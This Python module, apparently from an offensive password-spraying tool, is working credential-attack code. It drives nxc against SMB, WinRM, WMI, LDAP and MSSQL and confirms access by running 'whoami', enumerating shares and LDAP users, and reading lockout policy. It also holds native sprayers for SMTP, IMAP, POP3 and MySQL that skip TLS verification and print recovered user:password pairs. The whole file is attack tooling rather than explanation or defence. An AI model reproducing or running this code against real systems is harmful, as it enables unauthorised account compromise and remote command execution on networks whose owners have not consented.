"""Everything that actually talks to a target.

Two families live here:
  * ``run_nxc`` / ``validate_access`` / ``read_lockout_policy`` shell out to nxc.
  * ``run_native`` + ``spray_*`` implement pure-Python sprayers for mail / mysql.

Each returns ``(output, err)``: `err` is set only for operational failures
(timeout, unreachable, tool missing); authentication results come back as
`output` text for :mod:`parsing` to classify.
"""

import imaplib
import poplib
import re
import smtplib
import socket
import ssl
import subprocess


# ── nxc ─────────────────────────────────────────────────────────────────────
def run_nxc(proto, target, user, secret, is_hash, local_auth, timeout, proxychains=False):
    cmd = ["proxychains", "-q"] if proxychains else []
    cmd += ["nxc", proto, target, "-u", user]
    cmd += ["-H", secret] if is_hash else ["-p", secret]
    if local_auth:
        cmd.append("--local-auth")

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, timeout=timeout)
        return result.stdout + result.stderr, None
    except subprocess.TimeoutExpired:
        return "", "timeout"
    except FileNotFoundError:
        return "", "nxc not in PATH"
    except Exception as e:
        return "", str(e)


def validate_access(proto, target, user, secret, is_hash, timeout):
    """Secondary nxc check to tell real access apart from a bare auth success.
    Returns (is_access, message). NOTE: this costs one extra authentication."""
    creds = ["-H", secret] if is_hash else ["-p", secret]
    try:
        if proto == "smb":
            r = subprocess.run(["nxc", "smb", target, "-u", user, *creds, "--shares"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "ADMIN$" in r.stdout or "WRITE" in r.stdout:
                return True, "ADMIN$/WRITE share confirmed"
            return False, "Auth valid, limited share access"

        if proto in ("winrm", "wmi"):
            r = subprocess.run(["nxc", proto, target, "-u", user, *creds, "-x", "whoami"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if user.lower() in r.stdout.lower() or "Pwn3d!" in r.stdout:
                return True, f"{proto.upper()} command execution confirmed"
            return False, f"{proto.upper()} auth valid, no execution"

        if proto == "ldap":
            r = subprocess.run(["nxc", "ldap", target, "-u", user, *creds, "--users"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "CN=" in r.stdout or "userPrincipalName" in r.stdout:
                return True, "LDAP bind + enumeration confirmed"
            return False, "LDAP auth valid (use for BloodHound)"

        if proto == "mssql":
            r = subprocess.run(["nxc", "mssql", target, "-u", user, *creds, "-q", "SELECT @@version"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=timeout)
            if "Microsoft SQL Server" in r.stdout or "Pwn3d!" in r.stdout:
                return True, "MSSQL query execution confirmed"
            return False, "MSSQL auth valid, no execution"

    except subprocess.TimeoutExpired:
        return False, "Validation timed out"
    except Exception as e:
        return False, f"Validation error: {e}"

    return False, "No secondary confirmation"


def read_lockout_policy(target, user, secret, is_hash, timeout):
    """Run ``nxc smb --pass-pol`` and parse the lockout threshold / reset window.
    Returns {threshold:int|None, window:str} or None if it couldn't be read."""
    creds = ["-H", secret] if is_hash else ["-p", secret]
    try:
        r = subprocess.run(["nxc", "smb", target, "-u", user, *creds, "--pass-pol"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
    except Exception:
        return None
    out = r.stdout + r.stderr
    mt = re.search(r"Account Lockout Threshold:\s*(\d+|None)", out)
    mw = re.search(r"Reset Account Lockout Counter:\s*(.+)", out)
    if not mt:
        return None
    thr = None if mt.group(1) == "None" else int(mt.group(1))
    return {"threshold": thr, "window": (mw.group(1).strip() if mw else "unknown")}


# ── Native sprayers ──────────────────────────────────────────────────────────
def port_open(host, port, timeout=5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def spray_smtp(target, user, password, timeout, use_ssl=False):
    ports = [465] if use_ssl else [587, 25]
    reachable = [p for p in ports if port_open(target, p, timeout=min(timeout, 5))]
    if not reachable:
        return "", f"smtp: no port responded on {target} (tried {', '.join(map(str, ports))})"

    last_err = None
    for port in reachable:
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                server = smtplib.SMTP_SSL(target, port, timeout=timeout, context=ctx)
            else:
                server = smtplib.SMTP(target, port, timeout=timeout)
                try:
                    server.starttls(context=ssl._create_unverified_context())
                except Exception:
                    pass
            server.login(user, password)
            server.quit()
            return f"[+] SMTP {target}:{port} {user}:{password} — AUTH SUCCESS", None
        except smtplib.SMTPAuthenticationError as e:
            return f"[-] SMTP {target}:{port} {user} — AUTH FAILED ({e.smtp_code})", None
        except Exception as e:
            last_err = e
            continue
    return "", f"smtp: {target} reachable but no port accepted AUTH ({last_err})"


def spray_imap(target, user, password, timeout, use_ssl=False):
    port = 993 if use_ssl else 143
    if not port_open(target, port, timeout=min(timeout, 5)):
        return "", f"imap: {target}:{port} unreachable"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = imaplib.IMAP4_SSL(target, port, ssl_context=ctx, timeout=timeout)
        else:
            conn = imaplib.IMAP4(target, port, timeout=timeout)
        status, _ = conn.login(user, password)
        conn.logout()
        if status == "OK":
            return f"[+] IMAP {'SSL ' if use_ssl else ''}{target}:{port} {user}:{password} — AUTH SUCCESS", None
        return f"[-] IMAP {target}:{port} {user} — {status}", None
    except imaplib.IMAP4.error as e:
        if "locked" in str(e).lower():
            return f"STATUS_ACCOUNT_LOCKED_OUT IMAP {target} {user}", None
        return f"[-] IMAP {target}:{port} {user} — AUTH FAILED", None
    except (ConnectionRefusedError, socket.timeout, OSError):
        return "", f"imap: {target}:{port} unreachable"
    except Exception as e:
        return "", str(e)


def spray_pop3(target, user, password, timeout, use_ssl=False):
    port = 995 if use_ssl else 110
    if not port_open(target, port, timeout=min(timeout, 5)):
        return "", f"pop3: {target}:{port} unreachable"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = poplib.POP3_SSL(target, port, context=ctx, timeout=timeout)
        else:
            conn = poplib.POP3(target, port, timeout=timeout)
        conn.user(user)
        conn.pass_(password)
        conn.quit()
        return f"[+] POP3 {'SSL ' if use_ssl else ''}{target}:{port} {user}:{password} — AUTH SUCCESS", None
    except poplib.error_proto as e:
        if "lock" in str(e).lower():
            return f"STATUS_ACCOUNT_LOCKED_OUT POP3 {target} {user}", None
        return f"[-] POP3 {target}:{port} {user} — AUTH FAILED", None
    except (ConnectionRefusedError, socket.timeout, OSError):
        return "", f"pop3: {target}:{port} unreachable"
    except Exception as e:
        return "", str(e)


def spray_mysql(target, user, password, timeout):
    if not port_open(target, 3306, timeout=min(timeout, 5)):
        return "", f"mysql: {target}:3306 unreachable"
    try:
        import pymysql
        conn = pymysql.connect(host=target, port=3306, user=user,
                               password=password, connect_timeout=timeout)
        conn.close()
        return f"[+] MySQL {target}:3306 {user}:{password} — AUTH SUCCESS (Pwn3d!)", None
    except ImportError:
        return "", "pymysql not installed"
    except Exception as e:
        msg = str(e).lower()
        if "locked" in msg:
            return f"STATUS_ACCOUNT_LOCKED_OUT MySQL {target} {user}", None
        if "access denied" in msg:
            return f"[-] MySQL {target}:3306 {user} — ACCESS DENIED", None
        return "", f"mysql: {e}"


_NATIVE = {
    "smtp":  lambda t, u, s, to: spray_smtp(t, u, s, to, use_ssl=False),
    "smtps": lambda t, u, s, to: spray_smtp(t, u, s, to, use_ssl=True),
    "imap":  lambda t, u, s, to: spray_imap(t, u, s, to, use_ssl=False),
    "imaps": lambda t, u, s, to: spray_imap(t, u, s, to, use_ssl=True),
    "pop3":  lambda t, u, s, to: spray_pop3(t, u, s, to, use_ssl=False),
    "pop3s": lambda t, u, s, to: spray_pop3(t, u, s, to, use_ssl=True),
    "mysql": lambda t, u, s, to: spray_mysql(t, u, s, to),
}


def run_native(proto, target, user, secret, timeout):
    fn = _NATIVE.get(proto)
    if fn is None:
        return "", f"unknown native protocol: {proto}"
    return fn(target, user, secret, timeout)
